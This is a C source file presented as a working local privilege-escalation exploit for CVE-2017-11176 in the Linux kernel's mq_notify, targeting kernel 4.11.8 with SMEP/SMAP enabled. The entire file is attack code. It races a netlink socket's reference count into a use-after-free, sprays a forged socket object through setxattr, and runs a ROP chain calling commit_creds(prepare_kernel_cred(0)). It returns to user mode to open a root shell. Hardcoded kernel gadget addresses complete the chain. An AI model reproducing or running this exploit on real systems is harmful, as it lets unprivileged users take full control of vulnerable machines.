// gcc -masm=intel -static -o exploit exploit.c -lpthread
// Working exploit for CVE-2017-11176 (SMEP/SMAP enabled)
// Kernel version : Linux (none) 4.11.8

#include <stdio.h>
#include <mqueue.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/socket.h>
#include <asm/types.h>
#include <linux/netlink.h>
#include <assert.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#define NOTIFY_COOKIE_LEN 32

int mq_notify_syscall (mqd_t mqdes, struct sigevent *sevp) {
    return syscall(__NR_mq_notify, mqdes, sevp);
}

struct pthread_arg {
    int socket_fd;
    int new_fd;
};

unsigned long netlink_sock[0x3a8/8];

void *deblocker(void *arg) {
    

    struct pthread_arg *parg = (struct pthread_arg*)arg;

    int socket_fd = parg->socket_fd;
    int new_fd = parg->new_fd;
    
    int val = 4141;
    
    sleep(6);
    close(socket_fd);
    assert(
     setsockopt(new_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(int))
     == 0
     );

    return NULL;
}

struct trap_frame{
	char* rip;
	unsigned long cs;
	unsigned long rflags;
	char* rsp;
	unsigned long ss;
}__attribute__((packed));

struct trap_frame tf;

void save_state(void){
	asm volatile(   "mov tf+8, cs;"
			"pushf;"
			"pop tf+16;"
			"mov tf+24, rsp;"
			"mov tf+32, ss;"
			);

}

void shell(void){
	char* argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

void set_fake_netlink_sock () {
    int i = 0;
    
    unsigned long commit_creds = 0xffffffff81040a00;
    unsigned long prepare_kernel_cred = 0xffffffff81040ba0;
    
    unsigned long pop_rdi = 0xffffffff810005d4;
    unsigned long mov_rdi_rax_rep = 0xffffffff8100f631;
    unsigned long pop_rcx = 0xffffffff8108492d;
    unsigned long iretq = 0xffffffff81011b16;
    unsigned long swapgs_ret = 0xffffffff8118f118;
    unsigned long pop_2 = 0xffffffff81177da4;

    netlink_sock[i++] = 0x4D4D4D4D4D4D4D4D;
    netlink_sock[i++] = pop_rdi; // rop start here
    netlink_sock[i++] = 0x0;
    netlink_sock[i++] = prepare_kernel_cred;
    netlink_sock[i++] = pop_rcx;
    netlink_sock[i++] = 0x0;
    netlink_sock[i++] = mov_rdi_rax_rep;
    netlink_sock[i++] = commit_creds;
    netlink_sock[i++] = swapgs_ret;
    netlink_sock[i++] = pop_2;
    netlink_sock[i++] = 0;
    netlink_sock[i++] = 0;
    netlink_sock[i++] = iretq;
    netlink_sock[i++] = (unsigned long)&shell; //0xffff88001e599c68
    netlink_sock[i++] = tf.cs; //0xffff88001e599c68
    netlink_sock[i++] = tf.rflags;
    netlink_sock[i++] = (unsigned long)tf.rsp; //0xffff88001e599c80
    netlink_sock[i++] = tf.ss; //0xffff88001e599c80

    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffff88001e599c98;
    netlink_sock[i++] = 0xffff88001e599c98;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000090000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0003400000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffff88001e599d18;
    netlink_sock[i++] = 0xffff88001e599d18;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x00000000ffffffff;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x7fffffffffffffff;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffffffffffffffff;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x00000000014000c0;
    netlink_sock[i++] = 0x0000000000020220;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffffffff81440080;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x00000000000003e8;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x7fffffffffffffff;
    netlink_sock[i++] = 0xffffffffc4653600;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffffffff81150ae0;
    netlink_sock[i++] = 0xffffffff81150ea0;
    netlink_sock[i++] = 0xffffffff81150e10;
    netlink_sock[i++] = 0xffffffff81150db0;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffffffff81183510;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000064;
    netlink_sock[i++] = 0x0000000800000000;
    netlink_sock[i++] = 0x0000000100000000;
    netlink_sock[i++] = 0xffffffff8106d721; // printk
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffff88001e599ea0;
    netlink_sock[i++] = 0xffff88001e599ea0;
    netlink_sock[i++] = 0x0000000000000001;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffff88001e599f38;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0xffff88001e599f40;
    netlink_sock[i++] = 0xffff88001e599f40;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;

    // pivot gadget.
    netlink_sock[i++] = 0xffffffff81177d99; // rip
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000003;
    netlink_sock[i++] = 0xffff88001e559180;
    netlink_sock[i++] = 0xffffffff81183810;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
    netlink_sock[i++] = 0x0000000000000000;
}

int flood() {

    int send_fd, recv_fd;

    int ret;
    //(sk->sk_sndbuf - 32)
    char buf[1024];
    int new_size = 0;


    send_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
    assert(send_fd > 0);

    recv_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
    assert(recv_fd > 0);

    struct sockaddr_nl addr = {
        //if (addr->nl_family != AF_NETLINK)
        .nl_family = AF_NETLINK,

        // To make it unicast, we need it to achieve netlink_attachskb
        .nl_groups = 0,

        // We will bruteforce this.
        .nl_pid = 100,

        .nl_pad = 0,
    };

    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf),
    };

    struct msghdr msghdr = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,

        .msg_control = NULL,

        //if (msg->msg_controllen <= 0)
        //return 0; <- we need this
        .msg_controllen = 0,
        .msg_flags = 0,
    };

    /*
    struct sockaddr_in address;
    address.sin_family = AF_NETLINK;
    address.sin_port = htons(3334);
    */

    while(bind(recv_fd, (struct sockaddr *)&addr, sizeof(addr))) {
        if(errno != EADDRINUSE) {
            printf("bind: failed!");
            return -1;
        }

        addr.nl_pid++;
    }

    ret = setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size,
                sizeof(new_size));

    if(ret != 0) {
        printf("setsockopt failed but that's ok!\n");
    }

    while(sendmsg(send_fd, &msghdr, MSG_DONTWAIT) > 0) {
        printf("Sending msg...\n");
    }

    if (errno != EAGAIN) {
        printf("sendmsg: We didn't make it...\n");
        return -1;

    }

    printf("The receive buffer is full!\n");
    close(send_fd);
    return recv_fd;
}

int decrease_ref(int socket_fd) {
    assert(socket_fd > 0);
    
    struct sigevent se;
    
    memset(&se, 0, sizeof(se));

    char sival_ptr[NOTIFY_COOKIE_LEN];
    

    se.sigev_notify = SIGEV_THREAD;
    se.sigev_value.sival_ptr = &sival_ptr;
    se.sigev_signo = socket_fd;
    
    pthread_t tid;    
    
    
    int new_fd = dup(socket_fd);
    assert(new_fd > 0);
    struct pthread_arg arg;

    arg.socket_fd = socket_fd;
    arg.new_fd = new_fd;
   
    pthread_create(&tid, NULL, (void*)deblocker, (void*)&arg); 

    mq_notify_syscall((mqd_t)-1, &se);

    return new_fd;
}

int main() { 
    
    save_state();
    
    int socket_fd =  flood();
    
    int new_fd = decrease_ref(socket_fd);
    socket_fd = decrease_ref(new_fd);
    
    set_fake_netlink_sock();
    
    // Now our fake netlink_sock will take place in the real netlink_sock (UAF)
    setxattr("/tmp", "x", netlink_sock, 900, XATTR_CREATE);

    // trigger!
    close(socket_fd);
}
